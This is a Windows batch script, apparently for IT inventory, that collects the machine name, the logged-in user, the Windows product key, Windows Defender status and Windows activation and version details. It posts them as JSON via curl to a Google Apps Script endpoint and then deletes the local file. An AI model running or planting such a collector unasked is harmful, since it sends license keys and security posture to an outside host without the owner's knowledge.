@echo off
setlocal enabledelayedexpansion

:: Define o arquivo de saída
set "OUTPUT_FILE=%TEMP%\info_sistema.txt"
set "RESPONSE_FILE=%TEMP%\response.txt"
set "URL_WEB_APP=https://script.google.com/macros/s/AKfycbzOvlDGGmmM3AU2FKz406L9joi4SXe7QwiSppM4NWTzoXP6PKH9B8J4AwWCo_OdCHux4w/exec"

:: 1. Nome do Computador e Usuário Logado
set "computador=%COMPUTERNAME%"
set "usuario=Desconhecido"

for /f "tokens=1" %%a in ('query user 2^>nul ^| findstr /i /v "USERNAME" ^| findstr /v "^>"') do (
    set "usuario=%%a"
)

if "%usuario%"=="Desconhecido" (
    for /f "tokens=2" %%a in ('qwinsta 2^>nul ^| findstr /i "Active"') do (
        set "usuario=%%a"
    )
)

:: 2. Chave do Windows
set "chave=NAO encontrada"
for /f "usebackq delims=" %%i in (`powershell -command "(Get-CimInstance -Query 'select * from SoftwareLicensingService').OA3xOriginalProductKey" 2^>nul`) do (
    if not "%%i"==" " if not "%%i"=="" set "chave=%%i"
)
if "%chave%"=="NAO encontrada" (
    for /f "usebackq delims=" %%i in (`powershell -command "(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform').BackupProductKeyDefault" 2^>nul`) do (
        if not "%%i"==" " if not "%%i"=="" set "chave=%%i"
    )
)

:: 3. Status, Versão e Última Atualização do Windows Defender
set "defender=NAO"
set "defender_versao=Desconhecida"
set "defender_atualizacao=Desconhecida"

for /f "usebackq delims=" %%a in (`powershell -command "(Get-MpComputerStatus).RealTimeProtectionEnabled" 2^>nul`) do (
    if /i "%%a"=="True" set "defender=SIM"
)
for /f "usebackq delims=" %%a in (`powershell -command "(Get-MpComputerStatus).AMProductVersion" 2^>nul`) do (
    if not "%%a"=="" set "defender_versao=%%a"
)
for /f "usebackq delims=" %%a in (`powershell -command "(Get-MpComputerStatus).AntivirusSignatureLastUpdated" 2^>nul`) do (
    if not "%%a"=="" set "defender_atualizacao=%%a"
)

:: 4. Windows Ativado
set "windows_ativado=NAO"
for /f "tokens=2 delims==" %%i in ('wmic path SoftwareLicensingProduct where "ApplicationID='55c92734-d682-4d71-983e-d6ec3f16059f' and LicenseStatus=1" get Description /value 2^>nul') do (
    if not "%%i"=="" set "windows_ativado=SIM"
)

:: 5. Versao do Windows
set "windows_versao=Desconhecida"
for /f "usebackq delims=" %%i in (`powershell -command "(Get-CimInstance Win32_OperatingSystem).Caption" 2^>nul`) do (
    if not "%%i"=="" set "windows_versao=%%i"
)

set "windows_versao=%windows_versao:Microsoft =%"
set "windows_versao=%windows_versao:Windows =%"

:: MONTAR JSON
(
echo {
echo   "computador": "%computador%",
echo   "usuario": "%usuario%",
echo   "chave": "%chave%",
echo   "defender": "%defender%",
echo   "defender_versao": "%defender_versao%",
echo   "defender_atualizacao": "%defender_atualizacao%",
echo   "windows_ativado": "%windows_ativado%",
echo   "windows_versao": "%windows_versao%"
echo }
) > "%OUTPUT_FILE%"

:: Enviando os dados via cURL externo
curl.exe -L -s -o "%RESPONSE_FILE%" -X POST -H "Content-Type: application/json" -d "@%OUTPUT_FILE%" "%URL_WEB_APP%"
:: Limpa o arquivo JSON temporário após o envio
if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%"

exit /b
